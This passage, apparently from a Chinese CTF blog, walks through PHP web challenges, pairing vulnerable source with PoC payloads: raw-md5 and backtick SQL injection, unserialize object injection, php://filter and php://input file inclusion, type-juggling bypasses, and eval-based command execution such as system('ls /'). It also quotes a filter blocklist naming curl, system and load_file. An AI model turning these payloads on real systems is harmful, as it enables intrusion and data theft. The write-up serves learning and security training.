class="line">  echo &apos;select db error&apos;;</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line">// 执行sql</span><br><span class="line">$password = $_GET[&apos;password&apos;];</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;;</span><br><span class="line">var_dump($sql);</span><br><span class="line">$result=mysql_query($sql) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">$row1 = mysql_fetch_row($result);</span><br><span class="line">var_dump($row1);</span><br><span class="line">mysql_close($link);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password=ffifdyop</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>md5($password,true) 将md5后的hex转换成字符串<br>ffifdyopmd5后，276f722736c95d99e921722cf9ed621c hex转换成字符串：’or’6<trash> </trash></p>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>1.<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a><br>源码:<br>shield.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	//flag is in pctf.php</span><br><span class="line">	class Shield &#123;</span><br><span class="line">		public $file;</span><br><span class="line">		function __construct($filename = &apos;&apos;) &#123;</span><br><span class="line">			$this -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		function readfile() &#123;</span><br><span class="line">			if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  </span><br><span class="line">			&amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) &#123;</span><br><span class="line">				return @file_get_contents($this-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	require_once(&apos;shield.php&apos;);</span><br><span class="line">	$x = new Shield();</span><br><span class="line">	isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];</span><br><span class="line">	if (!empty($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line">	echo $x-&gt;readfile();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in pctf.php</span><br><span class="line">class Shield &#123;</span><br><span class="line">	public $file;</span><br><span class="line">	function __construct($filename = &apos;&apos;) &#123;</span><br><span class="line">		$this-&gt;file = $filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function readfile() &#123;</span><br><span class="line">		if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file, &apos;..&apos;) === FALSE</span><br><span class="line">			&amp;&amp; stripos($this-&gt;file, &apos;/&apos;) === FALSE &amp;&amp; stripos($this-&gt;file, &apos;\\&apos;) == FALSE) &#123;</span><br><span class="line">			return @file_get_contents($this-&gt;file);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$q = new Shield();</span><br><span class="line">$q-&gt;file = &apos;pctf.php&apos;;</span><br><span class="line">echo serialize($q);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>原理:就是用序列化初始Shield的一个实例$x，再调用$x的readfile()函数，把$x的属性$filename为名的文件内容读出来,提示说flag在pctf.php里，那直接写个脚本构造就行了。</p>
<h1 id="闭合反引号"><a href="#闭合反引号" class="headerlink" title="闭合反引号"></a>闭合反引号</h1><p>源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(“config.php”);</span><br><span class="line">$table = $_GET[&apos;table&apos;]?$_GET[&apos;table&apos;]:“test”;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,“desc `secret_&#123;$table&#125;`”) or Hacker();</span><br><span class="line">$sql = “select ‘flag&#123;xxx&#125;’ from secret_&#123;$table&#125;”;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line">echo $ret[0];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=flag` ` union select database() limit 1,1</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>首先要绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query($mysqli,“desc `secret_&#123;$table&#125;`”) or Hacker(); </span><br><span class="line">s</span><br></pre></td></tr></table></figure></p>
<p>,要注意前面的逻辑要正确，要不然就会执行Hacker()，试出secret_flag是存在的，闭合反引号就能注入了</p>
<h1 id="利用implode绕过正则"><a href="#利用implode绕过正则" class="headerlink" title="利用implode绕过正则"></a>利用implode绕过正则</h1><p>源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$role = &quot;guest&quot;;</span><br><span class="line">$flag = &quot;flag&#123;test_flag&#125;&quot;;</span><br><span class="line">$auth = false;</span><br><span class="line">if (isset($_COOKIE[&quot;role&quot;])) &#123;</span><br><span class="line">	$role = unserialize(base64_decode($_COOKIE[&quot;role&quot;]));</span><br><span class="line">	if ($role === &quot;admin&quot;) &#123;</span><br><span class="line">		$auth = true;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$auth = false;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$role = base64_encode(serialize($role));</span><br><span class="line">	setcookie(&apos;role&apos;, $role);</span><br><span class="line">&#125;</span><br><span class="line">if ($auth) &#123;</span><br><span class="line">	if (isset($_POST[&apos;filename&apos;])) &#123;</span><br><span class="line">		$filename = $_POST[&apos;filename&apos;];</span><br><span class="line">		$data = $_POST[&apos;data&apos;];</span><br><span class="line">		if (preg_match(&apos;[&lt;&gt;?]&apos;, $data)) &#123;</span><br><span class="line">			die(&apos;No No No!&apos; . $data);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			$s = implode($data);</span><br><span class="line">			if (!preg_match(&apos;[&lt;&gt;?]&apos;, $s)) &#123;</span><br><span class="line">				$flag = &apos;None.&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">			$rand = rand(1, 10000000);</span><br><span class="line">			$tmp = &quot;./uploads/&quot; . md5(time() + $rand) . $filename;</span><br><span class="line">			file_put_contents($tmp, $flag);</span><br><span class="line">			echo &quot;your file is in &quot; . $tmp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &quot;Hello admin, now you can upload something you are easy to forget.&quot;;</span><br><span class="line">		echo &quot;&lt;br /&gt;there are the source.&lt;br /&gt;&quot;;</span><br><span class="line">		echo &apos;&lt;textarea rows=&quot;10&quot; cols=&quot;100&quot;&gt;&apos;;</span><br><span class="line">		echo htmlspecialchars(str_replace($flag, &apos;flag&#123;???&#125;&apos;, file_get_contents(__FILE__)));</span><br><span class="line">		echo &apos;&lt;/textarea&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	echo &quot;Sorry. You have no permissions.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">设置cookie: role=czo1OiJhZG1pbiI7</span><br><span class="line">post:filename=1.php&amp;data[0]=&lt;</span><br></pre></td></tr></table></figure></p>
<p>原理:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">认证只要把s:5:&quot;admin&quot;; b64加密放cookie里就行因为有implode这个处理数组把数组元素合并成字符串的函数，所以基本确定data应该传个数组了,而preg_match无法处理数组，就能绕过正则了。</span><br></pre></td></tr></table></figure></p>
<h1 id="php-filter读源码"><a href="#php-filter读源码" class="headerlink" title="php://filter读源码"></a>php://filter读源码</h1><p>源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: ZTS</span><br><span class="line"> * Date: 2017/12/15</span><br><span class="line"> * Time: 9:54</span><br><span class="line"> */</span><br><span class="line">    header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">    $page=$_GET[&apos;page&apos;];</span><br><span class="line">    if (isset($_GET[&apos;page&apos;]))&#123;</span><br><span class="line">        include(&quot;$page&quot;);  //include 语句包含并运行指定文件。</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &apos;page!!!!&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*flag在Y29uZmln.php中，请使用本地文件包含方式获得flag*/</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/convert.base64-encode/resource=Y29uZmln.php</span><br></pre></td></tr></table></figure></p>
<p>原理：<br>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。<br>include()是执行文件，如果直接page=Y29uZmln.php的话只是看到phpinfo()函数的执行结果，无法读源码。<br>读源码还是要用php://filter</p>
<h1 id="利用优先级绕过一些判断"><a href="#利用优先级绕过一些判断" class="headerlink" title="利用优先级绕过一些判断"></a>利用优先级绕过一些判断</h1><p>源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: ZTS</span><br><span class="line"> * Date: 2017/12/15</span><br><span class="line"> * Time: 10:04</span><br><span class="line"> */</span><br><span class="line">    header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line"></span><br><span class="line">    $a = &apos;test&apos;;</span><br><span class="line">    $b = &apos;test2&apos;;</span><br><span class="line"></span><br><span class="line">    $a = $_GET[&apos;a&apos;];</span><br><span class="line">    $b = $_GET[&apos;b&apos;];</span><br><span class="line"></span><br><span class="line">    $c = is_numeric($a) and is_numeric($b);</span><br><span class="line"></span><br><span class="line">    if($c)&#123;</span><br><span class="line">        print &quot;flag&#123;Flag_iS_VulnCtf&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        print &quot;is_numeric(a) and is_numeric(b) error ！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=1</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>=的优先级大于and，只要前面是true就行<br>但把and换为&amp;&amp;就不行了,&amp;&amp;的优先级大于=</p>
<h1 id="还是弱类型"><a href="#还是弱类型" class="headerlink" title="还是弱类型"></a>还是弱类型</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: ZTS</span><br><span class="line"> * Date: 2017/12/15</span><br><span class="line"> * Time: 10:11</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">$a = @$_GET[&apos;a&apos;];</span><br><span class="line">if ($a == 0) &#123;</span><br><span class="line">	echo &quot;ZmxhZ3tUaGlTX2F&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if ($a) &#123;</span><br><span class="line">	echo &quot;fVnVsTkN0Rl9mbGFnfQ==&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>找到一种方法使两个条件都成立<br>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=abcdrfg</span><br><span class="line">?a=&apos;&apos;</span><br><span class="line">?a=.</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>php里字母==0，’’==0,’.’==0</p>
<h1 id="包含-序列化-php-input得到原始post数据，php-filter读源码"><a href="#包含-序列化-php-input得到原始post数据，php-filter读源码" class="headerlink" title="包含,序列化,php://input得到原始post数据，php://filter读源码"></a>包含,序列化,php://input得到原始post数据，php://filter读源码</h1><p>总的来说，一道典型的综合题<br>源码:<br>index.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: ZTS</span><br><span class="line"> * Date: 2017/12/15</span><br><span class="line"> * Time: 10:16</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">    $user = $_GET[&quot;user&quot;];</span><br><span class="line">    $file = $_GET[&quot;file&quot;];</span><br><span class="line">    $pass = $_GET[&quot;pass&quot;];</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">        isset函数是检测变量是否设置。</span><br><span class="line">        若变量不存在则返回 FALSE</span><br><span class="line">        若变量存在且其值为NULL，也返回 FALSE</span><br><span class="line">        若变量存在且值不为NULL，则返回 TURE</span><br><span class="line">        file_get_contents — 将整个文件读入一个字符串</span><br><span class="line">        preg_match — 执行匹配正则表达式</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</span><br><span class="line">        echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        if(preg_match(&quot;/f1aG/&quot;,$file))&#123;</span><br><span class="line">            exit();</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            include($file); //class.php</span><br><span class="line">            $pass = unserialize($pass);</span><br><span class="line">            echo $pass;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;you are not admin ! &quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>class.php（这个是用文件包含读出来的）:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: ZTS</span><br><span class="line"> * Date: 2017/12/15</span><br><span class="line"> * Time: 10:19</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">    class Read&#123;  //f1aG.php</span><br><span class="line">        public $file;</span><br><span class="line">        public function __toString()&#123;</span><br><span class="line">            if(isset($this-&gt;file))&#123;</span><br><span class="line">                echo file_get_contents($this-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">            return &quot;__toString was called!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>poc:<br>先给出一个概念:include()是执行文件里的代码，file_get_contents()是得到文件里的字符，<strong>但是无法得到&lt;?php …?&gt;里的内容</strong></p>
<p>第一步:利用php://input绕过对user的检验并用php://filter读取class.php的源码(php://input得到原始post数据,这里用的是include $file,但我们要的是源码不是让他执行,要用php://filter)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=php://input&amp;file=php://filter/convert.base64-encode/resource=class.php</span><br></pre></td></tr></table></figure></p>
<p>得到class.php之后发现这个Read类里有魔法函数,并且有个<code>echo file_get_contents($this-&gt;file);</code>，这里要注意两点：1.要让file=class.php,我们要执行class.php里的函数，不是读源码了。<br>2.序列化里还是要用php://filter读f1aG.php的源码，因为file_get_contents无法得到&lt;?php …?&gt;里的内容。</p>
<p>第二步:利用序列化和php://filter结合读取f1aG.php的源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1aG.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>生成序列的代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Read &#123;</span><br><span class="line">	//f1aG.php</span><br><span class="line">	public $file;</span><br><span class="line">	public function __toString() &#123;</span><br><span class="line">		if (isset($this-&gt;file)) &#123;</span><br><span class="line">			echo file_get_contents($this-&gt;file);</span><br><span class="line">		&#125;</span><br><span class="line">		return &quot;__toString was called!&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Read();</span><br><span class="line">$a-&gt;file = &apos;php://filter/read=convert.base64_encode/resource=f1aG.php&apos;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h1 id="执行命令"><a href="#执行命令" class="headerlink" title="${}执行命令"></a>${}执行命令</h1><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$str=@(string)$_GET[&apos;str&apos;];</span><br><span class="line">blackListFilter($black_list, $str);</span><br><span class="line">eval(&apos;$str=&quot;&apos;.addslashes($str).&apos;&quot;;&apos;);</span><br></pre></td></tr></table></figure></p>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.215.80:10013/index.php?str=$&#123;eval($_GET[c])&#125;&amp;c=system(&apos;ls /&apos;);</span><br></pre></td></tr></table></figure></p>
<p><code>ls /</code>里的/表示根目录</p>
<p>源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// PHP is the best language for hacker</span><br><span class="line">// Find the flag !!</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$_ = $_GET[&apos;🍣&apos;];</span><br><span class="line"></span><br><span class="line">if( strpos($_, &apos;&quot;&apos;) || strpos($_, &quot;&apos;&quot;) ) </span><br><span class="line">    die(&apos;Bad Hacker :(&apos;);</span><br><span class="line"></span><br><span class="line">eval(&apos;die(&quot;&apos; . substr($_, 0, 16) . &apos;&quot;);&apos;);</span><br></pre></td></tr></table></figure></p>
<p>测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.199.235.135:31333/?🍣=&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.199.235.135:31333/?🍣=&#123;$_GET[1](`ls`)&#125;&amp;1=print_r</span><br></pre></td></tr></table></figure></p>
<p>flag是文件名</p>
<h1 id="gt-任何数-表示"><a href="#gt-任何数-表示" class="headerlink" title="[]&gt;任何数,.表示_"></a>[]&gt;任何数,.表示_</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">ini_set(&quot;display_error&quot;, false);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (strpos($_SERVER[&apos;QUERY_STRING&apos;], &quot;A_A&quot;) !== false) &#123;</span><br><span class="line">	echo &apos;A_A,have fun&apos;;</span><br><span class="line">&#125; elseif ($str &lt; 9999999999) &#123;</span><br><span class="line">	echo &apos;A_A,too small&apos;;</span><br><span class="line">&#125; elseif ((string) $str &gt; 0) &#123;</span><br><span class="line">	echo &apos;A_A,too big&apos;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	echo &quot;flag&#123;neko_best!&#125;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>安恒5月的一个题。<br><code>if (strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;) !== false)</code><br>表示查询范式的开头不能是A<em>A,用A.A代替即可,php中.会被解析为</em>。<br>php中[]&gt;大于任何数用来绕过$str &lt; 9999999999，<br>此外(string) $str被转换为Array，”Array”==0为true,绕过(string) $str &gt; 0</p>
<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?A.A[]=1</span><br></pre></td></tr></table></figure></p>
<h1 id="in-array未设置第三个参数"><a href="#in-array未设置第三个参数" class="headerlink" title="in_array未设置第三个参数"></a>in_array未设置第三个参数</h1><p>config.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;root&quot;;</span><br><span class="line">$dbname = &quot;day1&quot;;</span><br><span class="line"></span><br><span class="line">function stop_hack($value) &#123;</span><br><span class="line">	$pattern = &quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;;</span><br><span class="line">	$back_list = explode(&quot;|&quot;, $pattern);</span><br><span class="line">	foreach ($back_list as $hack) &#123;</span><br><span class="line">		if (preg_match(&quot;/$hack/i&quot;, $value)) &#123;</span><br><span class="line">			die(&quot;$hack detected!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	return $value;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>index.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 